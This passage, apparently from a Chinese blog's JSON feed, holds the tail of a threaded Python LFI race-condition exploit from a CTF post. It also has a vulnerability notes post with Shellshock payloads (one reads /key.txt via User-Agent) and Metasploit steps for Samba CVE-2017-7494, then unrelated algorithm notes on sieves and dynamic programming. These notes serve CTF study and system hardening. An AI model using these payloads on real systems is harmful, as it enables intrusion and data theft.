data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    port<span class=\"token operator\">=</span><span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>        port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">except</span> IndexError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Error with port %d: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    poolsz<span class=\"token operator\">=</span><span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>        poolsz <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token keyword\">except</span> IndexError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Error with poolsz %d: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Getting initial offset...\"</span><span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    reqphp<span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">,</span> reqlfi <span class=\"token operator\">=</span> setup<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    offset <span class=\"token operator\">=</span> getOffset<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> reqphp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    maxattempts <span class=\"token operator\">=</span> <span class=\"token number\">1000</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    e <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    l <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Lock<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Spawning worker pool (%d)...\"</span> <span class=\"token operator\">%</span> poolsz</pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    tp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>poolsz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        tp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ThreadWorker<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>l<span class=\"token punctuation\">,</span>maxattempts<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> reqphp<span class=\"token punctuation\">,</span> offset<span class=\"token punctuation\">,</span> reqlfi<span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> tp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> e<span class=\"token punctuation\">.</span>wait<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>            <span class=\"token keyword\">if</span> e<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>            <span class=\"token keyword\">with</span> l<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>                sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span> <span class=\"token string\">\"\\r% 4d / % 4d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">,</span> maxattempts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>                sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>                <span class=\"token keyword\">if</span> counter <span class=\"token operator\">>=</span> maxattempts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>                    <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>        <span class=\"token keyword\">print</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>        <span class=\"token keyword\">if</span> e<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>            <span class=\"token keyword\">print</span> <span class=\"token string\">\"Woot!  \\m/\"</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            <span class=\"token keyword\">print</span> <span class=\"token string\">\":(\"</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"\\nTelling threads to shutdown...\"</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        e<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"Shuttin' down...\"</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> tp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        t<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n",
            "tags": [
                "Web",
                "CTF_Web"
            ]
        },
        {
            "id": "http://yoursite.com/Web/%E6%BC%8F%E6%B4%9E%E5%BA%93/",
            "url": "http://yoursite.com/Web/%E6%BC%8F%E6%B4%9E%E5%BA%93/",
            "title": "漏洞库",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"apache-struts2\"><a class=\"anchor\" href=\"#apache-struts2\">#</a> Apache Struts2</h1>\n<h2 id=\"s2-066-cve-2023-50164\"><a class=\"anchor\" href=\"#s2-066-cve-2023-50164\">#</a> S2-066  CVE-2023-50164</h2>\n<p>控制上传参数导致目录穿越，若允许上传危险后缀文件 <code>例如JSP</code> ，，则可结合该目录穿越漏洞上传 webshell 至可解析目录，实现 RCE。Struts2 只要<strong>配置 action 和 filter</strong> 就能正常使用</p>\n<p><strong>影响范围</strong></p>\n<ul>\n<li>\n<p>2.5.0 &lt;= Apache Struts &lt;= 2.5.32</p>\n</li>\n<li>\n<p>6.0.0 &lt;= Apache Struts &lt;= 6.3.0</p>\n</li>\n</ul>\n<p><strong>原理</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamF2YXNlYy5vcmcvamF2YS12dWxzL1N0cnV0cy9TdHJ1dHMyLTUuaHRtbA==\">Struts2 漏洞调试总结</span></p>\n<h1 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h1>\n<h2 id=\"bash-shellshock-cve-2014-6271\"><a class=\"anchor\" href=\"#bash-shellshock-cve-2014-6271\">#</a> Bash Shellshock  CVE-2014-6271</h2>\n<p>破壳漏洞</p>\n<p>调用 Bash Shell 之前可以用构造的值创建环境变量，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令</p>\n<figure class=\"highlight plaintext\"><figcaption data-lang=\"plaintext\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“()&#123;”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</pre></td></tr></table></figure><p><strong>影响范围</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Gnu Bash:3.2 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Gnu Bash:2.05:B </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Gnu Bash:3.0 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Gnu Bash:1.14.5 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Gnu Bash:1.14.6 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Gnu Bash:3.0.16 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Gnu Bash:1.14.7 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Gnu Bash:2.0 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Gnu Bash:2.01 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Gnu Bash:2.01.1</pre></td></tr></table></figure><p><strong>payload</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">env</span> <span class=\"token assign-left variable\">x</span><span class=\"token operator\">=</span><span class=\"token string\">'() &#123; :;&#125;; echo shellshocked'</span> <span class=\"token function\">bash</span> –c <span class=\"token string\">\"echo hi\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>User-Agent: <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token builtin class-name\">echo</span><span class=\"token punctuation\">;</span>/bin/cat /key.txt</pre></td></tr></table></figure><h2 id=\"samba-rce-cve-2017-7494\"><a class=\"anchor\" href=\"#samba-rce-cve-2017-7494\">#</a> Samba RCE  CVE-2017-7494</h2>\n<p>利用 smb 上的反弹 shell 漏洞实现 RCE</p>\n<p><strong>影响版本</strong></p>\n<ul>\n<li>\n<p>samba 3.5.0 到 4.6.4/4.5.10/4.4.14 的中间版本</p>\n</li>\n<li>\n<p>docker</p>\n</li>\n</ul>\n<p><strong>原理</strong></p>\n<p>Samba 允许连接一个远程的命名管道，并且在连接前会调用 <code>is_known_pipename()</code>  函数验证管道名称是否合法。在 <code>is_known_pipename()</code>  函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。</p>\n<p><strong>条件</strong></p>\n<ul>\n<li>\n<p>拥有共享文件写入权限，如：匿名可写等</p>\n</li>\n<li>\n<p>需要知道共享目录的物理路径</p>\n</li>\n</ul>\n<p><strong>payload</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>search is_know</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>user <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// use exploit/linux/samba/is_know_pipename</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>show options</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>set RHOST</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>set SMB_FOLDER <span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>share  <span class=\"token comment\">// 目标可写的目录的绝对路径</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit</pre></td></tr></table></figure><p><strong>系统加固</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> /etc/samba/smb.conf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Esc</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">76</span>行的位置，添加nt pipe support <span class=\"token operator\">=</span> no</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>:wq</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">service</span> smb restart</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">service</span> smb reload</pre></td></tr></table></figure>",
            "tags": [
                "Web",
                "Vulnerability"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/",
            "url": "http://yoursite.com/Algorithm/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/",
            "title": "动态规划",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h2 id=\"动态规划\"><a class=\"anchor\" href=\"#动态规划\">#</a> 动态规划</h2>\n<h3 id=\"最长公共子串\"><a class=\"anchor\" href=\"#最长公共子串\">#</a> 最长公共子串</h3>\n<p>利用二维数组求解</p>\n<p>若 <code>s[ i ] == s[ j ]</code> ， <code>dp[ i ] [ j ] = dp[ i - 1 ] [ j - 1 ] + 1</code></p>\n<p>若 <code>s[ i ] != s[ j ]</code> ， <code>dp[ i ] [ j ] = 0</code></p>\n<h3 id=\"最长公共子序列\"><a class=\"anchor\" href=\"#最长公共子序列\">#</a> 最长公共子序列</h3>\n<p>若 <code>s[ i ] == s[ j ]</code> ， <code>dp[ i ] [ j ] = dp[ i - 1 ] [ j - 1 ] + 1</code></p>\n<p>若 <code>s[ i ] != s[ j ]</code> ， <code>dp[ i ] [ j ] = max（dp[ i - 1 ] [ j ]，dp[ i ] [ j - 1 ]）</code></p>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E8%B4%A8%E6%95%B0%E9%97%AE%E9%A2%98/",
            "url": "http://yoursite.com/Algorithm/%E8%B4%A8%E6%95%B0%E9%97%AE%E9%A2%98/",
            "title": "质数问题",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h2 id=\"质数问题\"><a class=\"anchor\" href=\"#质数问题\">#</a> 质数问题</h2>\n<h3 id=\"朴素筛\"><a class=\"anchor\" href=\"#朴素筛\">#</a> 朴素筛</h3>\n<p>筛掉所有数（<strong>素数和合数都有参与最外层循环</strong>）的倍数，for 循环不在 if 语句里</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> tot <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 质数个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//2 到 n 循环</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>check<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        prime<span class=\"token punctuation\">[</span>tot<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数为质数，存入 prime [] 数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token comment\">//tot 加一，质数个数加一</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        check<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 标记合数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"埃氏筛\"><a class=\"anchor\" href=\"#埃氏筛\">#</a> 埃氏筛</h3>\n<ul>\n<li>基本思想：一次循环筛掉当前素数的倍数</li>\n<li><strong>缺点</strong>：存在重复筛选，比如 6 既可以被 2 筛掉，又可以被 3 筛掉</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> tot <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 质数个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//2 到 n 循环</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>check<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 筛掉已经被质数倍数标记过的合数，避免让合数进入循环</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        prime<span class=\"token punctuation\">[</span>tot<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数为质数，存入 prime [] 数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token comment\">//tot 加一，质数个数加一</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    \t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \tcheck<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 标记合数</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    \t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"线性筛\"><a class=\"anchor\" href=\"#线性筛\">#</a> 线性筛</h3>\n<ul>\n<li>中心思想：只能被最小质因子筛掉</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">get_primes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>st<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> primes<span class=\"token punctuation\">[</span>cnt <span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span><span class=\"token comment\">// 若当前 i 未被标记过，仍为 0，筛选入 primes 数组</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                                      <span class=\"token comment\">// 当前 cnt 为素数个数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> cnt <span class=\"token operator\">&amp;&amp;</span> primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 下面将利用 primes [j]*i 寻找合数，现在给其设定条件</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tst<span class=\"token punctuation\">[</span>primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 找到的合数标记为 1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">%</span> primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 当前数 /(遍历找到) 最小质因数，最差情况 i 为素数遍历最后为 primes [cnt - 1] = i</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>&lt;table&gt;<br />\n&lt;tr&gt;<br />\n&lt;th&gt; 循环次数 &lt;/th&gt;<br />\n&lt;th&gt; 当前被判断的数 i&lt;/th&gt;<br />\n&lt;th&gt;prime [] 素数的计数数组 &lt;/th&gt;<br />\n&lt;th&gt; 此次循环筛掉的合数 prime [j] * i&lt;/th&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第一次 &lt;/td&gt;<br />\n&lt;th&gt;2&lt;/th&gt;<br />\n&lt;td&gt;[2]&lt;/td&gt;<br />\n&lt;td&gt;4&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第二次 &lt;/td&gt;<br />\n&lt;th&gt;3&lt;/th&gt;<br 